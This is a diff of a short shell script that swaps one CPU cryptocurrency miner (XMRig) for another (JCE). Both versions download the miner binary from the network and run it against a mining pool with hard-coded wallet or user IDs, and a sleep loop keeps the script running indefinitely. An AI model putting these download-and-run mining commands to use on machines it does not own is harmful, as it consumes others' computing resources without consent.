@@ -1,8 +1,7 @@
 #!/bin/sh
- wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar xf xmrig-6.15.1-linux-x64.tar.gz
-cd xmrig-6.15.1
-./xmrig -a argon2/chukwav2 -o sg.turtlecoin.herominers.com:1160 -u TRTLv1JytGXQPggFrD7DwNEhAJSMtnXaseDSzunfck8bYygcSkk6K2iYHsFv5bCxescqRNSaELhUTEaQWqJW7pNjSG8p2M7svg7.$(shuf -n 1 -i 1-99999)-cpu --keepalive --timeout 120 --donate-level 0 -p c=BCH,mc=UPX
+wget https://raw.githubusercontent.com/jceminer/cn_cpu_miner/master/jce_cn_cpu_miner.linux.033q.zip
+unzip jce_cn_cpu_miner.linux.033q.zip
+./jce_cn_cpu_miner64 --auto --any --forever --keepalive --variation 2 --low -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.jerwel22 -p x
 while [ 1 ]; do
 sleep 3
 done
